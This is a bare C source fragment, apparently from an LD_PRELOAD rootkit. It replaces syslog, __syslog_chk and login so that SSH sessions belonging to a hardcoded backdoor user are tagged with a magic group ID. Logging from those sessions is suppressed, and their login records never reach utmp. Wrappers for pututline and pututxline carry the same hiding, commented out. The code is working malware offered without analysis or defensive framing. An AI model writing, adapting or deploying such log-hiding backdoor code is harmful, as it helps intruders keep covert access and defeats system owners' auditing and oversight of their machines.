#include <syslog.h>
static const struct utmp *(*old_pututline) (const struct utmp *ut);
static const struct utmpx *(*old_pututxline) (const struct utmpx *ut);
void *libc;

void __syslog_chk(int priority, int flag, const char *format, ...) {
  va_list va;
  if(getgid() == MAGIC_GID) return;
  if(strstr(get_my_procname(), "sshd: " BD_USER )) {
    setgid(MAGIC_GID);
    return;
  }
  va_start(va, format);
  vsyslog(priority, format, va); // not hooking this cause nobody uses it
  va_end(va);
  return;
}
void syslog(int priority, const char *format, ...) {
  va_list va;
  if(getgid() == MAGIC_GID) return;
  if(strstr(get_my_procname(), "sshd: " BD_USER )) {
    setgid(MAGIC_GID);
    return;
  }
  va_start(va, format);
  vsyslog(priority, format, va);
  va_end(va);
  return;
}

struct utmp *pututline(const struct utmp *ut) {
//  if(!strcmp(ut->ut_user,BD_USER)) return (struct utmp*)ut;
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_pututline) old_pututline = dlsym (libc, "pututline");
  return (struct utmp*) old_pututline(ut);
}

struct utmpx *pututxline(const struct utmpx *ut) {
//  if(!strcmp(ut->ut_user,BD_USER)) return (struct utmpx*)ut;
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_pututxline) old_pututxline = dlsym (libc, "pututxline");
  return (struct utmpx*) old_pututxline(ut);
}

void login(const struct utmp *ut) {
  if(!old_login) old_login = find_sym(RTLD_NEXT, "login");
  if(!strcmp(ut->ut_user, BD_USER)) return;
  old_login(ut);
}
